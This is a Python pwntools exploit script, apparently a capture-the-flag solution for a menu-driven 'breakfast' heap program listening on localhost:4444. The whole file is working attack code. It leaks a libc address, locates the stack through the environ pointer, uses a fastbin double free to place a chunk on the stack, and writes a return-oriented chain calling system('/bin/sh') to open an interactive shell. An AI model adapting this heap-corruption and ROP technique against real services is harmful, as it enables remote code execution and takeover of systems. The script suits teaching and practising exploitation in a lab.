from pwn import *

# Tested on Ubuntu 16.04

def menu():
	r.recvuntil("5.- Exit\n")

def create(pos, size):
	menu()
	r.sendline("1")
	r.recvuntil("Enter the position of breakfast\n")
	r.sendline(str(pos))
	r.recvuntil("Enter the size in kcal.\n")
	r.sendline(str(size))

def ingredients(num, payload):
	menu()
	r.sendline("2")
	r.recvuntil("Introduce the menu to ingredients\n")
	r.sendline(str(num))	
	r.recvuntil("Enter the ingredients\n")
	r.sendline(payload)

def ver(num):
	menu()
	r.sendline("3")
	r.recvuntil("Enter the breakfast to see\n")
	r.sendline(str(num))
	data = r.recvline()
	return data

def delete(num):
	menu()
	r.sendline("4")
	r.recvuntil("Introduce the menu to delete\n")
	r.sendline(str(num))

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

r = remote("localhost", 4444)
create(1, 80)
create(2, 80)
ingredients(1, p64(0x602030))
leak = u64(ver(1)[:8].ljust(8, '\0'))
base_libc = leak - 0x3c48e0
p_environ = base_libc + libc.symbols['environ']
ingredients(1, p64(p_environ))
p_stack = u64(ver(1)[:8].ljust(8, '\0')) - 0x134
p_system = base_libc + libc.symbols['system']
p_bin_sh = base_libc + next(libc.search("/bin/sh\0"))
print "[+] ptr stack: %s" % hex(p_stack)
print "[+] base libc: %s" % hex(base_libc)
print "[+] system   : %s" % hex(p_system)
print "[+] /bin/sh  : %s" % hex(p_bin_sh) 
delete(1)
delete(2)
delete(1)
ingredients(1, p64(p_stack))
create(3, 80)
create(96, 80)
ingredients(96, "A"*0x14 + p64(0x400c03) + p64(p_bin_sh) + p64(p_system))
r.interactive()


